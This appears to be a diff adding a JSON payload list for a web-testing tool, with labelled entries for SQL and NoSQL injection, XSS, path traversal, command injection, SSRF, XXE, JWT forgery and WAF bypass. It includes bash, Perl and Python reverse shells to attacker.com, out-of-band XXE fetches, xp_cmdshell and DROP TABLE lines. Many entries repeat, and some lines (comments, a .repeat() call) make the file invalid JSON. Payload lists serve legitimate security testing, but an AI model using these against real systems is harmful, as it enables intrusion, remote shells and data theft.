@@ -1,0 +1,599 @@
+{
+    "payloads": [
+        {
+            "label": "Null Byte",
+            "value": "%00"
+        },
+        {
+            "label": "Null Byte Doble",
+            "value": "%2500"
+        },
+        {
+            "label": "Bypass con punto",
+            "value": "."
+        },
+        {
+            "label": "Traversal simple",
+            "value": "../"
+        },
+        {
+            "label": "Traversal encoding",
+            "value": "%2e%2e%2f"
+        },
+        {
+            "label": "Traversal profundo",
+            "value": "../../../../etc/passwd"
+        },
+        {
+            "label": "ID negativo",
+            "value": "-1"
+        },
+        {
+            "label": "ID cero",
+            "value": "0"
+        },
+        {
+            "label": "String admin",
+            "value": "admin"
+        },
+        {
+            "label": "String test",
+            "value": "test"
+        },
+        {
+            "label": "Bypass con coma",
+            "value": "1,2"
+        },
+        {
+            "label": "Injection SQL básica",
+            "value": "' OR 1=1 --"
+        },
+        {
+            "label": "Injection SQL doble comilla",
+            "value": "\" OR \"\"=\""
+        },
+        {
+            "label": "Encoding raro",
+            "value": "%c0%ae%c0%ae%c0%af"
+        },
+        {
+            "label": "IDor con suplantación",
+            "value": "victim@domain.com"
+        },
+        {
+            "label": "Bypass usando parámetro duplicado",
+            "value": "1&user=2"
+        },
+        {
+            "label": "Parámetro JSON",
+            "value": "{\"user_id\":1}"
+        },
+        {
+            "label": "Parámetro en base64",
+            "value": "dXNlcl9pZD0x"
+        },
+        {
+            "label": "Encoded Unicode",
+            "value": "%u002e%u002e%u002f"
+        },
+        {
+            "label": "CSRF Token Faker",
+            "value": "<input type='hidden' name='csrf' value='fake123'>"
+        },
+        {
+            "label": "SQLi UNION SELECT",
+            "value": "' UNION SELECT NULL--"
+        },
+        {
+            "label": "SQLi Time-based",
+            "value": "' OR SLEEP(5)--"
+        },
+        {
+            "label": "SQLi Stacked Queries",
+            "value": "'; SELECT 1;--"
+        },
+        {
+            "label": "SQLi Blind",
+            "value": "' AND (SELECT SUBSTRING(@@version,1,1))='5"
+        },
+        {
+            "label": "XSS Simple",
+            "value": "<script>alert(1)</script>"
+        },
+        {
+            "label": "XSS SVG",
+            "value": "<svg/onload=alert(1)>"
+        },
+        {
+            "label": "XSS Event Handler",
+            "value": "\"><img src=x onerror=alert(1)>"
+        },
+        {
+            "label": "XSS JS URI",
+            "value": "javascript:alert(1)"
+        },
+        {
+            "label": "LFI Basic",
+            "value": "../../etc/passwd"
+        },
+        {
+            "label": "LFI Null Byte",
+            "value": "../../etc/passwd%00"
+        },
+        {
+            "label": "LFI Windows",
+            "value": "..\\..\\windows\\win.ini"
+        },
+        {
+            "label": "RCE Bash Injection",
+            "value": "test; id"
+        },
+        {
+            "label": "RCE Bash Subshell",
+            "value": "$(id)"
+        },
+        {
+            "label": "RCE Backtick",
+            "value": "`id`"
+        },
+        {
+            "label": "SSRF HTTP",
+            "value": "http://127.0.0.1:80"
+        },
+        {
+            "label": "SSRF File",
+            "value": "file:///etc/passwd"
+        },
+        {
+            "label": "SSRF Gopher",
+            "value": "gopher://127.0.0.1:6379/_PING"
+        },
+        {
+            "label": "XXE Basic",
+            "value": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+        },
+        {
+            "label": "Command Injection Pipe",
+            "value": "test|id"
+        },
+        {
+            "label": "Command Injection Ampersand",
+            "value": "test&id"
+        },
+        {
+            "label": "Command Injection Semicolon",
+            "value": "test;id"
+        },
+        {
+            "label": "Open Redirect",
+            "value": "//evil.com"
+        },
+        {
+            "label": "Open Redirect Data URI",
+            "value": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+        },
+        {
+            "label": "Path Traversal Double URL Encode",
+            "value": "%252e%252e%252f"
+        },
+        {
+            "label": "Path Traversal UTF-8",
+            "value": "%c0%ae%c0%ae%c0%af"
+        },
+        {
+            "label": "CRLF Injection",
+            "value": "%0d%0aSet-Cookie:%20crlf=injection"
+        },
+        {
+            "label": "HTTP Header Injection",
+            "value": "test\r\nX-Injected-Header: injected"
+        },
+        {
+            "label": "Base64 Encoded XSS",
+            "value": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+        },
+        {
+            "label": "Base64 Encoded SQLi",
+            "value": "JyBPUiAxPTEgLS0="
+        },
+        {
+            "label": "XML Injection",
+            "value": "<foo>&bar;</foo>"
+        },
+        {
+            "label": "JSON Injection",
+            "value": "{\"user\": \"admin\", \"role\": \"admin\"}"
+        },
+        {
+            "label": "JWT None Algorithm",
+            "value": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
+        },
+        {
+            "label": "JWT SQLi",
+            "value": "eyJ1c2VyIjoiJyBPUiAxPTEgLS0ifQ=="
+        },
+        {
+            "label": "XSS Polyglot",
+            "value": "\"><svg/onload=confirm`1`>//"
+        },
+        {
+            "label": "XSS DOM Clobbering",
+            "value": "<input name=location onfocus=alert(1) autofocus>"
+        },
+        {
+            "label": "XSS UTF-7",
+            "value": "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-"
+        },
+        {
+            "label": "XSS in SVG animate",
+            "value": "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>"
+        },
+        {
+            "label": "XSS with MathML",
+            "value": "<math><mtext></mtext><script>alert(1)</script></math>"
+        },
+        {
+            "label": "XSS with malformed script",
+            "value": "<scr<script>ipt>alert(1)</scr</script>ipt>"
+        },
+        {
+            "label": "SQLi WAF Bypass",
+            "value": "' OR 1=1#"
+        },
+        {
+            "label": "SQLi Hex Encoding",
+            "value": "' OR 0x31=0x31--"
+        },
+        {
+            "label": "SQLi Inline Comment",
+            "value": "' /*!50000OR*/ 1=1--"
+        },
+        {
+            "label": "SQLi Case Variation",
+            "value": "' oR 1=1--"
+        },
+        {
+            "label": "SQLi Batched Statements",
+            "value": "'; WAITFOR DELAY '0:0:5'--"
+        },
+        {
+            "label": "NoSQLi Basic",
+            "value": "{\"$ne\":null}"
+        },
+        {
+            "label": "NoSQLi Array Injection",
+            "value": "admin' || '1'=='1"
+        },
+        {
+            "label": "NoSQLi MongoDB Operator",
+            "value": "{\"username\": {\"$gt\": \"\"}}"
+        },
+        {
+            "label": "RCE Bash Function",
+            "value": "() { :; }; echo vulnerable"
+        },
+        {
+            "label": "RCE Python Eval",
+            "value": "__import__('os').system('id')"
+        },
+        {
+            "label": "RCE PHP Assert",
+            "value": "assert($_GET[x]);"
+        },
+        {
+            "label": "RCE Windows CMD",
+            "value": "& whoami &"
+        },
+        {
+            "label": "SSRF DNS",
+            "value": "http://127.0.0.1.xip.io"
+        },
+        {
+            "label": "SSRF Internal AWS",
+            "value": "http://169.254.169.254/latest/meta-data/"
+        },
+        {
+            "label": "SSRF Localhost Decimal",
+            "value": "http://2130706433"
+        },
+        {
+            "label": "SSRF Localhost Octal",
+            "value": "http://0177.0.0.1"
+        },
+        {
+            "label": "XXE Parameter Entity",
+            "value": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>"
+        },
+        {
+            "label": "XXE OOB",
+            "value": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>"
+        },
+        {
+            "label": "Deserialization Java",
+            "value": "rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0x"
+        },
+        {
+            "label": "Deserialization PHP",
+            "value": "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}"
+        },
+        {
+            "label": "Deserialization Python Pickle",
+            "value": "cos\nsystem\n(S'id'\ntR."
+        },
+        {
+            "label": "JWT None Bypass",
+            "value": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
+        },
+        {
+            "label": "JWT Algorithm Confusion",
+            "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ==.invalidsig"
+        },
+        {
+            "label": "GraphQL Injection",
+            "value": "{\"query\":\"{__schema{types{name}}}\"}"
+        },
+        {
+            "label": "GraphQL Batch Injection",
+            "value": "[{\"query\":\"{users{id}}\"},{\"query\":\"{admin{id}}\"}]"
+        },
+        {
+            "label": "CRLF HTTP Response Splitting",
+            "value": "%0d%0aContent-Length:%200%0d%0a%0d%0a"
+        },
+        {
+            "label": "WAF Bypass Unicode Homoglyph",
+            "value": "<scrіpt>alert(1)</scrіpt>"
+        },
+        {
+            "label": "WAF Bypass Null Char",
+            "value": "<script\x00>alert(1)</script>"
+        },
+        {
+            "label": "WAF Bypass HTML Entities",
+            "value": "&lt;script&gt;alert(1)&lt;/script&gt;"
+        },
+        {
+            "label": "WAF Bypass CSS Injection",
+            "value": "<style>@import'//evil.com/x.css';</style>"
+        },
+        {
+            "label": "WAF Bypass Data URI",
+            "value": "data:text/html;base64,PHNjcmlwdD1hbGVydCgxKT4="
+        },
+        {
+            "label": "WAF Bypass Obfuscated JS",
+            "value": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
+        },
+        {
+            "label": "WAF Bypass JS Prototype Pollution",
+            "value": "__proto__[admin]=true"
+        },
+        {
+            "label": "WAF Bypass HTTP Parameter Pollution",
+            "value": "id=1&id=2"
+        },
+        {
+            "label": "WAF Bypass Path Traversal",
+            "value": "..%2f..%2f..%2fetc%2fpasswd"
+        },
+        {
+            "label": "WAF Bypass SQL Comment",
+            "value": "'/*!or*/1=1--"
+        },
+        {
+            "label": "WAF Bypass SQL Inline",
+            "value": "'or/**/1=1--"
+        },
+        {
+            "label": "WAF Bypass SQL Case",
+            "value": "' Or 1=1--"
+        },
+        {
+            "label": "XSS Polyglot Advanced",
+            "value": "\"><svg/onload=alert(1)//<script>alert(1)</script>"
+        },
+        {
+            "label": "XSS with Tab Newline",
+            "value": "<svg/onload=alert`1`\t\n>"
+        },
+        {
+            "label": "XSS with Base Tag",
+            "value": "<base href=\"javascript://\"><script>alert(1)</script>"
+        },
+        {
+            "label": "XSS with Iframe Srcdoc",
+            "value": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
+        },
+        {
+            "label": "XSS with Meta Refresh",
+            "value": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"
+        },
+        {
+            "label": "XSS with Object Data",
+            "value": "<object data=\"javascript:alert(1)\"></object>"
+        },
+        {
+            "label": "XSS with Form Action",
+            "value": "<form action=\"javascript:alert(1)\"><input type=submit></form>"
+        },
+        {
+            "label": "XSS with SVG ForeignObject",
+            "value": "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>"
+        },
+        {
+            "label": "XSS with Malformed Attribute",
+            "value": "<img src=x oneonerrorerror=alert(1)>"
+        },
+        {
+            "label": "XSS with MathML",
+            "value": "<math><mtext></mtext><script>alert(1)</script></math>"
+        },
+        {
+            "label": "XSS with UTF-7",
+            "value": "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-"
+        },
+        {
+            "label": "XSS with Event Handler",
+            "value": "<body onresize=alert(1)>"
+        },
+        {
+            "label": "XSS with Malformed Script",
+            "value": "<scr<script>ipt>alert(1)</scr</script>ipt>"
+        },
+        {
+            "label": "XSS with Srcdoc",
+            "value": "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
+        },
+        {
+            "label": "XSS with Data URI",
+            "value": "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>"
+        },
+        {
+            "label": "XSS with Template Tag",
+            "value": "<template><img src=x onerror=alert(1)></template>"
+        },
+        {
+            "label": "XSS with Details Tag",
+            "value": "<details open ontoggle=alert(1)></details>"
+        },
+        {
+            "label": "XSS with SVG Animate",
+            "value": "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>"
+        },
+        {
+            "label": "XSS with SVG Set",
+            "value": "<svg><set onbegin=alert(1) attributeName=x to=1 /></svg>"
+        },
+        {
+            "label": "XSS with SVG Script",
+            "value": "<svg><script>alert(1)</script></svg>"
+        },
+
+        // SQLi
+        { "label": "SQLi Unicode Bypass", "value": "' OR 1=1%ef%bc%87--" },
+        { "label": "SQLi Double Query", "value": "'; SELECT version();--" },
+        { "label": "SQLi Sleep with Comment", "value": "' OR SLEEP(5)#" },
+        { "label": "SQLi Inline Execution", "value": "'; EXEC xp_cmdshell('whoami');--" },
+        { "label": "SQLi Boolean Based", "value": "' OR 'a'='a" },
+        { "label": "SQLi with Char", "value": "' OR CHAR(65)=CHAR(65)--" },
+        { "label": "SQLi with Information Schema", "value": "' UNION SELECT table_name FROM information_schema.tables--" },
+        { "label": "SQLi with ExtractValue", "value": "' AND ExtractValue(1,concat(0x7e,(SELECT user()),0x7e))--" },
+        { "label": "SQLi with UpdateXML", "value": "' AND UpdateXML(1,concat(0x7e,(SELECT user()),0x7e),1)--" },
+        { "label": "SQLi with Benchmark", "value": "' AND BENCHMARK(1000000,MD5(1))--" },
+        { "label": "SQLi with Load_File", "value": "' UNION SELECT LOAD_FILE('/etc/passwd')--" },
+        { "label": "SQLi with INTO OUTFILE", "value": "' UNION SELECT 'test' INTO OUTFILE '/tmp/test.txt'--" },
+        { "label": "SQLi with Stacked Queries", "value": "'; DROP TABLE users;--" },
+        { "label": "SQLi with Case", "value": "' oR 1=1--" },
+        { "label": "SQLi with Inline Comment", "value": "' /*!50000OR*/ 1=1--" },
+        { "label": "SQLi with Hex Encoding", "value": "' OR 0x31=0x31--" },
+        { "label": "SQLi with Inline Comment 2", "value": "'or/**/1=1--" },
+        { "label": "SQLi with WAF Bypass", "value": "'/*!or*/1=1--" },
+        { "label": "SQLi with Case/Comment", "value": "' Or/**/1=1--" },
+        { "label": "SQLi with Inline Execution 2", "value": "'; WAITFOR DELAY '0:0:5'--" },
+
+        // NoSQLi
+        { "label": "NoSQLi Regex", "value": "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$ne\": null}}" },
+        { "label": "NoSQLi OR Operator", "value": "{\"$or\": [{\"admin\": true}, {\"username\": \"admin\"}]}" },
+        { "label": "NoSQLi $where", "value": "{\"$where\": \"this.password.length > 0\"}" },
+        { "label": "NoSQLi Basic", "value": "{\"$ne\":null}" },
+        { "label": "NoSQLi Array Injection", "value": "admin' || '1'=='1" },
+        { "label": "NoSQLi MongoDB Operator", "value": "{\"username\": {\"$gt\": \"\"}}" },
+        { "label": "NoSQLi with Comment", "value": "{\"username\": \"admin\", \"password\": {\"$comment\": \"injection\"}}" },
+        { "label": "NoSQLi with $ne", "value": "{\"username\": {\"$ne\": \"\"}}" },
+        { "label": "NoSQLi with $gt", "value": "{\"age\": {\"$gt\": 0}}" },
+        { "label": "NoSQLi with $in", "value": "{\"role\": {\"$in\": [\"admin\", \"user\"]}}" },
+
+        // RCE
+        { "label": "RCE Bash Chained", "value": "test;uname -a;id" },
+        { "label": "RCE Bash Reverse Shell", "value": "bash -i >& /dev/tcp/attacker.com/4444 0>&1" },
+        { "label": "RCE Perl Reverse Shell", "value": "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
+        { "label": "RCE Python Reverse Shell", "value": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" },
+        { "label": "RCE Bash Function", "value": "() { :; }; echo vulnerable" },
+        { "label": "RCE Python Eval", "value": "__import__('os').system('id')" },
+        { "label": "RCE PHP Assert", "value": "assert($_GET[x]);" },
+        { "label": "RCE Windows CMD", "value": "& whoami &" },
+        { "label": "RCE Bash Subshell", "value": "$(id)" },
+        { "label": "RCE Backtick", "value": "`id`" },
+
+        // SSRF
+        { "label": "SSRF IPv6 Localhost", "value": "http://[::1]/" },
+        { "label": "SSRF FTP", "value": "ftp://127.0.0.1" },
+        { "label": "SSRF File Protocol", "value": "file:///windows/win.ini" },
+        { "label": "SSRF Expect Protocol", "value": "expect://ls" },
+        { "label": "SSRF LDAP Protocol", "value": "ldap://127.0.0.1" },
+        { "label": "SSRF DNS", "value": "http://127.0.0.1.xip.io" },
+        { "label": "SSRF Internal AWS", "value": "http://169.254.169.254/latest/meta-data/" },
+        { "label": "SSRF Localhost Decimal", "value": "http://2130706433" },
+        { "label": "SSRF Localhost Octal", "value": "http://0177.0.0.1" },
+        { "label": "SSRF Gopher", "value": "gopher://127.0.0.1:6379/_PING" },
+
+        // XXE
+        { "label": "XXE External Entity", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil\">]><foo>&xxe;</foo>" },
+        { "label": "XXE Parameter Entity OOB", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>" },
+        { "label": "XXE PHP Filter", "value": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>" },
+        { "label": "XXE Basic", "value": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>" },
+        { "label": "XXE Parameter Entity", "value": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>" },
+
+        // Prototype Pollution
+        { "label": "Prototype Pollution Basic", "value": "__proto__[polluted]=true" },
+        { "label": "Prototype Pollution Deep", "value": "constructor.prototype.polluted=true" },
+        { "label": "Prototype Pollution JSON", "value": "{\"__proto__\":{\"polluted\":true}}" },
+
+        // GraphQL
+        { "label": "GraphQL Injection", "value": "{\"query\":\"{__schema{types{name}}}\"}" },
+        { "label": "GraphQL Batch Injection", "value": "[{\"query\":\"{users{id}}\"},{\"query\":\"{admin{id}}\"}]" },
+        { "label": "GraphQL Alias Injection", "value": "{\"query\":\"query x{a:__schema{types{name}}}\"}" },
+        { "label": "GraphQL Batch Query", "value": "[{\"query\":\"{users{id}}\"},{\"query\":\"{__typename}\"}]" },
+
+        // CRLF
+        { "label": "CRLF Set-Cookie", "value": "%0d%0aSet-Cookie:%20session=evil" },
+        { "label": "CRLF Location Header", "value": "%0d%0aLocation:%20//evil.com" },
+        { "label": "CRLF HTTP Response Splitting", "value": "%0d%0aContent-Length:%200%0d%0a%0d%0a" },
+        { "label": "CRLF Injection", "value": "%0d%0aSet-Cookie:%20crlf=injection" },
+
+        // Deserialization
+        { "label": "Deserialization Java", "value": "rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0x" },
+        { "label": "Deserialization PHP", "value": "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}" },
+        { "label": "Deserialization Python Pickle", "value": "cos\nsystem\n(S'id'\ntR." },
+
+        // JWT
+        { "label": "JWT None Algorithm", "value": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." },
+        { "label": "JWT SQLi", "value": "eyJ1c2VyIjoiJyBPUiAxPTEgLS0ifQ==" },
+        { "label": "JWT None Bypass", "value": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." },
+        { "label": "JWT Algorithm Confusion", "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ==.invalidsig" },
+
+        // WAF Bypass
+        { "label": "WAF Bypass XSS Encoded", "value": "%3Cscript%3Ealert(1)%3C%2Fscript%3E" },
+        { "label": "WAF Bypass SQLi Obfuscated", "value": "'||(SELECT/**/1)--" },
+        { "label": "WAF Bypass Path Traversal Mixed", "value": "..%252f..%252f..%252fetc%252fpasswd" },
+        { "label": "WAF Bypass XSS Backtick", "value": "<img src=x onerror=alert`1`>" },
+        { "label": "WAF Bypass XSS fromCharCode", "value": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>" },
+        { "label": "WAF Bypass SQLi Case/Comment", "value": "' Or/**/1=1--" },
+        { "label": "WAF Bypass SQLi Inline Comment", "value": "'/*!or*/1=1--" },
+        { "label": "WAF Bypass SQLi Unicode", "value": "' OR 1=1%ef%bc%87--" },
+        { "label": "WAF Bypass HTTP Smuggling", "value": "GET / HTTP/1.1\r\nHost: victim\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" },
+        { "label": "WAF Bypass HTTP/2 Smuggling", "value": "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n" },
+        { "label": "WAF Bypass JSON Unicode", "value": "{\"user\\u0022:1,\"role\":\"admin\"}" },
+        { "label": "WAF Bypass JSON Comment", "value": "{\"user\":/*comment*/\"admin\"}" },
+        { "label": "WAF Bypass Unicode Homoglyph", "value": "<scrіpt>alert(1)</scrіpt>" },
+        { "label": "WAF Bypass Null Char", "value": "<script\x00>alert(1)</script>" },
+        { "label": "WAF Bypass HTML Entities", "value": "&lt;script&gt;alert(1)&lt;/script&gt;" },
+        { "label": "WAF Bypass CSS Injection", "value": "<style>@import'//evil.com/x.css';</style>" },
+        { "label": "WAF Bypass Data URI", "value": "data:text/html;base64,PHNjcmlwdD1hbGVydCgxKT4=" },
+        { "label": "WAF Bypass Obfuscated JS", "value": "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>" },
+        { "label": "WAF Bypass JS Prototype Pollution", "value": "__proto__[admin]=true" },
+        { "label": "WAF Bypass HTTP Parameter Pollution", "value": "id=1&id=2" },
+        { "label": "WAF Bypass Path Traversal", "value": "..%2f..%2f..%2fetc%2fpasswd" },
+
+        // Fuzzing/Headers/Other
+        { "label": "Fuzzing Long String", "value": "A".repeat(4096) },
+        { "label": "Fuzzing Special Chars", "value": "!@#$%^&*()_+-=~`[]{}|;:',.<>/?\\" },
+        { "label": "Fuzzing Null Bytes", "value": "\x00\x00\x00\x00" },
+        { "label": "Fuzzing Format String", "value": "%x%x%x%x" },
+        { "label": "Header Injection Newline", "value": "test\nInjected: yes" },
+        { "label": "Header Injection CRLF", "value": "test\r\nInjected: yes" },
+        { "label": "Header Injection Tab", "value": "test\tInjected: yes" },
+        { "label": "Header Injection Unicode", "value": "test\u2028Injected: yes" },
+        { "label": "Header Injection Null", "value": "test\0Injected: yes" }
+    ]
+}
